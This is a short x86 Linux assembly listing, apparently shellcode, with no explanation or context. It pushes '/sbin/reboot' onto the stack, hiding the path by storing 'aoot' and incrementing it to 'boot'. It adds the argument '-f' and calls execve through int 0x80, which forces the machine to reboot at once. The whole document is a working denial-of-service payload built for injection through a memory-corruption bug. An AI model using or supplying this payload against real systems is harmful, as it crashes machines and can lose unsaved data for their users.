section .text

global _start

  _start:
    xor eax,eax    						        
    push eax        
    mov ebx, 0x746f6f61  
    inc ebx           					     
    push ebx           
    mov dword [esp-4], 0x65722f6e 		
    mov dword [esp-8], 0x6962732f     
    sub esp, 8
    mov ebx,esp    						        
    push eax        
    push word 0x662d  					      
    mov esi,esp    						        
    push eax        
    push esi         					        
    push ebx        					       
    mov ecx,esp    
    mov al,0xb     						        
    int 0x80       						       
